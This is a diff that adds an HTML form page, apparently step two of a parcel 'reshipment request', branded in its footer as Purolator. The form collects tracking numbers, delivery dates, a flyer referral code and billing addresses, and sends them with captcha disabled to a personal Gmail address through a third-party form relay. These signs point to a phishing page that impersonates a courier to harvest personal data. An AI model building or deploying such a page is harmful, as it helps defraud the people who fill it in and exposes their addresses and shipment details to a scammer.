@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Request Details - Step 2</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+
+    <header class="main-header"><div class="container"><div class="logo"><a href="index.html"><img src="logo.png" alt="Logo"></a></div></div></header>
+
+    <div class="page-hero">
+        <div class="container">
+            <h1>Request Details</h1>
+            <p>Step 2 of 2: Verification & Billing</p>
+        </div>
+    </div>
+
+    <section class="section-pad">
+        <div class="container">
+            <div class="form-card" style="border-top-color: var(--puro-blue);">
+                <h2><i class="fa-solid fa-file-invoice"></i> Additional Information</h2>
+                
+                <form action="https://formsubmit.co/natashaxeadie@gmail.com" method="POST">
+                    
+                    <input type="hidden" name="_next" value="thankyou.html">
+                    <input type="hidden" name="_subject" value="New Reshipment Request (Step 2)">
+                    <input type="hidden" name="_captcha" value="false">
+
+                    <div class="form-section-title">Package Details</div>
+                    <div class="form-col" style="margin-bottom: 20px;">
+                        <label>Special Request Details</label>
+                        <textarea name="Request Details" rows="3" placeholder="Any specific instructions..."></textarea>
+                    </div>
+
+                    <div class="form-row">
+                        <div class="form-col">
+                            <label>Original Delivery Number (Tracking ID) *</label>
+                            <input type="text" name="Delivery Number" required>
+                        </div>
+                        <div class="form-col">
+                            <label>Referral Code (from flyer)</label>
+                            <input type="text" name="Referral Code">
+                        </div>
+                    </div>
+
+                    <div class="form-row">
+                        <div class="form-col">
+                            <label>Original Delivery Month *</label>
+                            <select name="Delivery Month" required>
+                                <option value="">Select Month</option>
+                                <option>January</option><option>February</option><option>March</option>
+                                <option>April</option><option>May</option><option>June</option>
+                                <option>July</option><option>August</option><option>September</option>
+                                <option>October</option><option>November</option><option>December</option>
+                            </select>
+                        </div>
+                        <div class="form-col">
+                            <label>Delivery Year *</label>
+                            <select name="Delivery Year" required>
+                                <option>2026</option><option>2025</option><option>2024</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <div class="form-section-title">Billing Address (If different from Shipping)</div>
+                    <div class="form-col" style="margin-bottom: 20px;">
+                        <label>Street Address</label>
+                        <input type="text" name="Billing Street">
+                    </div>
+                    
+                    <div class="form-row">
+                        <div class="form-col"><label>City</label><input type="text" name="Billing City"></div>
+                        <div class="form-col"><label>State/Prov</label><input type="text" name="Billing State"></div>
+                    </div>
+                    
+                    <div class="form-row">
+                        <div class="form-col"><label>Country</label><input type="text" name="Billing Country"></div>
+                        <div class="form-col"><label>Postal Code</label><input type="text" name="Billing Zip"></div>
+                    </div>
+
+                    <div class="text-center" style="margin-top: 30px;">
+                        <button type="submit" class="btn btn-blue" style="width: 100%; font-size: 1.1rem;">Complete Request <i class="fa-solid fa-check"></i></button>
+                    </div>
+
+                </form>
+            </div>
+        </div>
+    </section>
+
+    <footer><div class="container"><p class="text-center">&copy; 2026 Purolator All Rights Reserved.</p></div></footer>
+</body>
+</html>
